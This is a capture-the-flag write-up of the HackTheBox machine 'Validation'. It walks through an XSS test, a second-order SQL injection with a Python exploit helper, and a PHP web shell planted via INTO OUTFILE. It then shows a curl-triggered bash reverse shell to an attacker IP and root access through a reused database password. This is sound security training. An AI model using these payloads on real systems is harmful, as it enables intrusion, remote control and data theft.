---
title: Validation
tags:
  - HackTheBox
  - Easy
  - Linux
  - SQLi
  - Python-Scripting
---
![](Pasted%20image%2020241121101424.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.116 validation.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- validation.htb > sC.txt

[redacted]
PORT     STATE    SERVICE
22/tcp   open     ssh
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open     http
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
4566/tcp open     kwtc
5000/tcp filtered upnp
5001/tcp filtered commplex-link
5002/tcp filtered rfe
5003/tcp filtered filemaker
5004/tcp filtered avt-profile-1
5005/tcp filtered avt-profile-2
5006/tcp filtered wsm-server
5007/tcp filtered wsm-server-ssl
5008/tcp filtered synapsis-edge
8080/tcp open     http-proxy
|_http-title: 502 Bad Gateway
```

So I decided to take a look at the website:

![](Pasted%20image%2020241121101821.png)

I entered some testing usernames: 

![](Pasted%20image%2020241121101911.png)

So I decided to test some basic XSS and got one working:

```js
"><script>alert('xss')</script>
```

![](Pasted%20image%2020241121102102.png)

I couldn't get anything from this, so I decided to capture the request with Burp and inspect the petition. I noticed that if I sent the petition multiple times, the cookie was always the same for the same user, so now I know that the **user cookie is not random**:

![](Pasted%20image%2020241121102401.png)

If I do:

```shell
echo -n "pepe" | md5sum
# 926e27eecdbc7a18858b3798ba99bddd
```

I get that exactly cookie (which is basic md5). I can't do anything with this also.

So I decided to perform basic SQLi with Burp in the parameter `country`:

![](Pasted%20image%2020241121103754.png)

Now I use the generated cookie to load `validation.php`again (I did it with other user btw):

![](Pasted%20image%2020241121104107.png)

Here we can notice that an exception occurred:

```js
Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33
Stack trace:
#0 {main}
  thrown in <b>/var/www/html/account.php</b> on line <b>33
```

This is a second-order SQLi.

So I can guess that there is a SQL query running behind. I tried a UNION SQLi:

```sql
Brazil' UNION SELECT 1 -- -
```

![](Pasted%20image%2020241121104542.png)

 So now we can notice that there are no errors displayed and there seems to be a column named `1`. Now I decided to use a python script to execute commands instead of using Burp Repeater:

```python
#!/usr/bin/env python3

import random
import requests
from bs4 import BeautifulSoup
from cmd import Cmd

class Term(Cmd):
    prompt = "$> "

    def default(self, args):
        name = f'gitblanc-{random.randrange(1000000,9999999)}'
        resp = requests.post('http://validation.htb/',
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                # Here goes the SQLi in the post data
                data={"username": name, "country": f"' union {args};-- -"})
        soup = BeautifulSoup(resp.text, 'html.parser')
        if soup.li:
            print('\n'.join([x.text for x in soup.findAll('li')]))

    def do_quit(self, args):
        return 1

term = Term()
term.cmdloop()
```

![](Pasted%20image%2020241121105219.png)

I'll enumerate the database with:

```sql
select schema_name from information_schema.schemata
```

![](Pasted%20image%2020241121105422.png)

I'm interested in the `registration` database. So I'll enumerate it:

```sql
select table_name from information_schema.tables where table_schema='registration'
```

It has only a ingle table also called `registration`:

![](Pasted%20image%2020241121105648.png)

Now I'll enumerate it:

```sql
select column_name from information_schema.columns where table_name='registration'
```

![](Pasted%20image%2020241121105753.png)

Unfortunately, there is no password or whatever. So i decided to try to introduce a webshell using `INTO OUTFILE` function:

```sql
select "gitblanc trying to webshell" into outfile '/var/www/html/gitblanc.txt'
```

![](Pasted%20image%2020241121110215.png)

I got it! So I can now introduce a web shell:
- I'll use one on [Reverse shells 👾](/notes/reverse_shells.md)

```sql
select "<?php SYSTEM($_REQUEST['cmd']); ?>" into outfile '/var/www/html/gitblanc.php'
```

> I got it!

![](Pasted%20image%2020241121110557.png)

Now it's time to execute a reverse shell inside the web shell:

```shell
curl -s http://validation.htb/gitblanc.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.11/666 0>&1"'
```

![](Pasted%20image%2020241121111109.png)

> I got a reverse shell

## Privilege Escalation

I decided to inspect further the machine and only found `/var/www/html(config.php`:

```php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

So I decided to test this password against `root` (it's always worth to check):

![](Pasted%20image%2020241121111554.png)

> *Astonishingly, this worked*

So I can now read both user and root flag :D

![](Pasted%20image%2020241121111742.png)

==Machine pwned!==



